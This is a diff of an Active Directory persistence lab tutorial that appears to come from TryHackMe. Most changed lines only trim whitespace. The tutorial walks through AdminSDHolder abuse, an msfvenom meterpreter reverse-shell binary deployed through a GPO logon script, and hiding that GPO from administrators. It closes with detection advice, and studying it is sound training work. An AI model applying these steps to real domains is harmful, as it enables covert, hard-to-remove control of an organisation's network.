-SID               : S-1-5-21-3885271727-2693558621-2658995185-6163
+name : Am0 Net Group 5
+objectClass : group
+objectGUID : ba545574-6af9-4a3d-a8df-24ab582fc04c
+SamAccountName : am0_nestgroup5
+SID : S-1-5-21-3885271727-2693558621-2658995185-6163
 ```
 
-## Annoying More Than Just The Blue Team  
+## Annoying More Than Just The Blue Team 
 
 If this was a real organization, we would not be creating new groups to nest. Instead, we would make use of the existing groups to perform nesting. However, this is something you would never do on a normal red team assessment and almost always dechain at this point since it breaks the organization's AD structure, and if we sufficiently break it, they would not be able to recover. At this point, even if the blue team was able to kick us out, the organization would more than likely still have to rebuild their entire AD structure from scratch, resulting in significant damages.
 
@@ -1062,7 +1060,7 @@ If this was a real organization, we would not be creating new groups to nest. In
 
 ---
 
-Sometimes, we need more than just persisting to normal AD groups. What if we want to persist to all protected groups simultaneously?  
+Sometimes, we need more than just persisting to normal AD groups. What if we want to persist to all protected groups simultaneously? 
 
 ## Persisting through AD Group Templates
 
@@ -1076,7 +1074,7 @@ A process called SDProp takes the ACL of the AdminSDHolder container and applies
 
 In order to deploy our persistence to the AdminSDHolder, we will use Microsoft Management Console (MMC). To avoid kicking users out of their RDP sessions, it will be best to RDP into THMWRK1 using your low privileged credentials, use the runas command to inject the Administrator credentials, and then execute MMC from this new terminal:
 
-`runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe`  
+`runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe` 
 
 Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:
 
@@ -1093,14 +1091,14 @@ Let's add our low-privileged user and grant Full Control:
 3. Click **OK**.
 4. Click **Allow** on **Full Control**.
 5. Click **Apply**.
-6. Click **OK**.  
-    
+6. Click **OK**. 
+ 
 
 It should look something like this:
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/75c8454bf447398db713da5fbae160dc.png)
 
-## SDProp  
+## SDProp 
 
 Now we just need to wait 60 minutes, and our user will have full control over all Protected Groups. This is because the Security Descriptor Propagator (SDProp) service executes automatically every 60 minutes and will propagate this change to all Protected Groups. However, since we do not like to wait, let's kick off the process manually using Powershell. In the `C:\Tools\` directory, a script `Invoke-ADSDPropagation` is provided::
 
@@ -1132,7 +1130,7 @@ Imagine combining this with the nesting groups of the previous task. Just as the
 
 ---
 
-The last persistence technique we will review is persistence through Group Policy Objects (GPOs). At this point, you should be familiar with GPOs based on all the different enumeration, attack, and exploitation techniques we have discussed. However, GPOs are also excellent for deploying persistence.  
+The last persistence technique we will review is persistence through Group Policy Objects (GPOs). At this point, you should be familiar with GPOs based on all the different enumeration, attack, and exploitation techniques we have discussed. However, GPOs are also excellent for deploying persistence. 
 
 Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup. While this is an excellent tool for management, it can be targeted by attackers to deploy persistence across the entire estate. What is even worse is that the attacker can often hide the GPO in such a way that it becomes almost impossible to remove it.
 
@@ -1141,7 +1139,7 @@ Group Policy Management in AD provides a central mechanism to manage the local p
 The following are some common GPO persistence techniques:
 
 - Restricted Group Membership - This could allow us administrative access to all hosts in the domain
-- Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.  
+- Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain. 
 
 There are many different hooks that can be deployed. You can play around with GPOs to learn about other hooks. Since we already used the first hook, Restricted Group Membership, in the Exploiting AD room. Let's now focus on the second hook. While having access to all hosts are nice, it can be even better by ensuring we get access to them when administrators are actively working on them. To do this, we will create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.
 
@@ -1149,11 +1147,11 @@ There are many different hooks that can be deployed. You can play around with GP
 
 Before we can create the GPO. We first need to create our shell, listener, and the actual bat file that will execute our shell. Let's start by generating a basic executable shell that we can use:
 
-`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe   `  
+`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe ` 
 
 Make sure to add your username to the binary name to avoid overwriting the shells of other users. Windows allows us to execute Batch or PowerShell scripts through the logon GPO. Batch scripts are often more stable than PowerShell scripts so lets create one that will copy our executable to the host and execute it once a user authenticates. Create the following script called `<username>_script.bat` on the AttackBox:
 
-`copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe`  
+`copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe` 
 
 You will see that the script executes three commands chained together with `&&`. The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.
 
@@ -1171,7 +1169,7 @@ Finally, let's start our MSF listener:
 
 With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.
 
-GPO Creation  
+GPO Creation 
 
 The first step uses our Domain Admin account to open the Group Policy Management snap-in:
 
@@ -1182,19 +1180,19 @@ The first step uses our Domain Admin account to open the Group Policy Management
 
 You should be able to see the GPO manager:
 
-![GPO Edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/62aab3368a951e8180c35bef9ed82ead.png)  
+![GPO Edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/62aab3368a951e8180c35bef9ed82ead.png) 
 
 While we can technically write our contents to the Default Domain Policy, which should propagate to all AD objects, we will take a more narrow approach for the task just to show the process. You can play around afterwards to apply the changes to the entire domain.
 
 We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as `username - persisting GPO`:
 
-![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e71058947046aa9b8e77dff06292d15b.png)  
+![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e71058947046aa9b8e77dff06292d15b.png) 
 
 Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:
 
 ![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/99a7c82a27440ca59365581c3191ce24.png)
 
-Let's get back to our Group Policy Management Editor:  
+Let's get back to our Group Policy Management Editor: 
 
 1. Under User Configuration, expand **Policies->Windows Settings**.
 2. Select **Scripts (Logon/Logoff)**.
@@ -1204,9 +1202,9 @@ Let's get back to our Group Policy Management Editor:
 
 Let's navigate to where we stored our Batch and binary files:
 
-![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c74b252805561488167c1a7c5d02dcce.png)  
+![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c74b252805561488167c1a7c5d02dcce.png) 
 
-  
+ 
 
 Select your Batch file as the script and click **Open** and **OK**. Click **Apply** and **OK**. This will now ensure that every time one of the administrators (tier 2, 1, and 0) logs into any machine, we will get a callback.
 
@@ -1226,13 +1224,13 @@ meterpreter >
 
 Note: You need to create a Logon event for the GPO to execute. If you just closed your RDP session, that only performs a disconnect which means it would not trigger the GPO. Make sure to select navigate to sign out as shown below in order to terminate the session. This will ensure that a Logon event is generated when you reauthenticate:
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7e98b74b5dd21316a351384085eb2b5d.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7e98b74b5dd21316a351384085eb2b5d.png) 
 
-## Hiding in Plain Sight  
+## Hiding in Plain Sight 
 
 Now that we know that our persistence is working, it is time to make sure the blue team can't simply remove our persistence. Go back to your MMC windows, click on your policy and then click on Delegation:
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/744c4e6a1dd0a5aef63680cc7cf53120.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/744c4e6a1dd0a5aef63680cc7cf53120.png) 
 
 By default, all administrators have the ability to edit GPOs. Let's remove these permissions:
 
@@ -1241,11 +1239,11 @@ By default, all administrators have the ability to edit GPOs. Let's remove these
 
 You should be left with delegation that looks like this:
 
-![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/79f5e69b102214a73b605ed86e67aa7d.png)  
+![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/79f5e69b102214a73b605ed86e67aa7d.png) 
 
 Click on Advanced and remove the Created Owner from the permissions:
 
-![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/cb338537225085db379e8f5fecf82684.png)  
+![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/cb338537225085db379e8f5fecf82684.png) 
 
 By default, all authenticated Users must have the ability to read the policy. This is required because otherwise, the policy could not be read by the user's account when they authenticate to apply User policies. If we did not have our logon script, we could also remove this permission to make sure that almost no one would be able to read our Policy.
 
@@ -1262,7 +1260,7 @@ Right after you perform these steps, you will get an error that you can no longe
 
 You can also see on the sidebar that we can no longer read this policy:
 
-![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c960f0e9443e92abe52a4993e7ad1287.png)  
+![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c960f0e9443e92abe52a4993e7ad1287.png) 
 
 By performing these steps, we can ensure that even with the highest level of permissions, the blue team would not be able to remove our GPO unless they impersonated the machine account of a Domain Controller. This makes it extra hard to firstly discover, and even if they discover the GPO, it would be incredibly hard to remove. We don't even have the required permissions to interface with our policy anymore, so one will have to stay there until a network reset is performed. You can verify that the GPO is still applied by RDPing into one of the THMSERVERS.
 
@@ -1276,27 +1274,27 @@ By performing these steps, we can ensure that even with the highest level of per
 
 There are several different ways that we can persist in AD. Some of these techniques persist better than others. In order to ensure that your persistence cannot be removed by the blue team, you will have to think creatively about your persistence. Furthermore, you should not wait until the full domain compromise to deploy persistence. After each round of lateral movement and privilege escalation, persistence should be deployed.
 
-## Additional Persistence Techniques  
+## Additional Persistence Techniques 
 
 In this network, we covered several techniques that can be used to persist in AD. This is by no means an exhaustive list. Here is a list of persistence techniques that also deserve mention:
 
-- **[Skeleton keys](https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/) -** Using Mimikatz, we can deploy a skeleton key. Mimikatz created a default password that will work for any account in the domain. Normal passwords will still work, making it hard to know that this attack has taken place. This default password can be used to impersonate any account in the domain.  
+- **[Skeleton keys](https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/) -** Using Mimikatz, we can deploy a skeleton key. Mimikatz created a default password that will work for any account in the domain. Normal passwords will still work, making it hard to know that this attack has taken place. This default password can be used to impersonate any account in the domain. 
 
-- **[Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714) -** Domain controllers have an internal break glass administrator account called the DSRM account. This password is set when the server is promoted to a DC and is seldom changed. This password is used in cases of emergencies to recover the DC. An attacker can extract this password using Mimikatz and use this password to gain persistent administrative access to domain controllers in the environment.  
-    
-- **[Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760) -** Exploiting the SSP interface, it is possible to add new SSPs. We can add Mimikatz's mimilib as an SSP that would log all credentials of authentication attempts to a file. We can specify a network location for logging, which would allow mimilib to send us credentials as users authenticate to the compromised host, providing persistence.  
-    
-- **[Computer Accounts](https://adsecurity.org/?p=2753)** **-** The passwords for machine accounts are normally rotated every 30 days. However, we can alter the password of a machine account which would stop the automatic rotation. Together with this, we can grant the machine account administrative access to other machines. This will allow us to use the computer account as a normal account, with the only sign of the persistence being the fact that the account has administrative rights over other hosts, which is often normal behaviour in AD, so that it may go undetected.  
-    
+- **[Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714) -** Domain controllers have an internal break glass administrator account called the DSRM account. This password is set when the server is promoted to a DC and is seldom changed. This password is used in cases of emergencies to recover the DC. An attacker can extract this password using Mimikatz and use this password to gain persistent administrative access to domain controllers in the environment. 
+ 
+- **[Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760) -** Exploiting the SSP interface, it is possible to add new SSPs. We can add Mimikatz's mimilib as an SSP that would log all credentials of authentication attempts to a file. We can specify a network location for logging, which would allow mimilib to send us credentials as users authenticate to the compromised host, providing persistence. 
+ 
+- **[Computer Accounts](https://adsecurity.org/?p=2753)** **-** The passwords for machine accounts are normally rotated every 30 days. However, we can alter the password of a machine account which would stop the automatic rotation. Together with this, we can grant the machine account administrative access to other machines. This will allow us to use the computer account as a normal account, with the only sign of the persistence being the fact that the account has administrative rights over other hosts, which is often normal behaviour in AD, so that it may go undetected. 
+ 
 
-We should also note that this room focussed on persistence techniques in AD. Several local persistence techniques can also allow for persistence on hosts. If these hosts are domain joined, it will allow for persistence in AD as well.  
+We should also note that this room focussed on persistence techniques in AD. Several local persistence techniques can also allow for persistence on hosts. If these hosts are domain joined, it will allow for persistence in AD as well. 
 
 ## Mitigations
 
 AD persistence can be a pain to defend against. In certain cases, the persistence can be so deeply rooted that a complete domain rebuild is required. However, there are a couple of things that we can do to detect deployed persistence:
 
 - Anomalous account logon events are the most common alert for persistence. Any time credentials break the tiering model, it can be as a result of persistence.
-- For each of the persistence techniques mentioned, specific detection rules can be written, such as cases when a machine account's password changes, ACLs are permissively updated, or new GPOs are created.  
+- For each of the persistence techniques mentioned, specific detection rules can be written, such as cases when a machine account's password changes, ACLs are permissively updated, or new GPOs are created. 
 - The best defense against persistence is to protect privileged resources. Although low privileged access can be used to deploy persistence, the truly scary techniques only become available once an attacker has acquired privileged access to the domain.
 
 This concludes the AD module. We have learned about the basics of AD, how to breach an AD environment, enumerate it, perform exploitation, and deeply root ourselves in with persistence. This module is just an introduction. There is still a lot to learn about AD security. Time to spread your wings and do some of your own exploration!
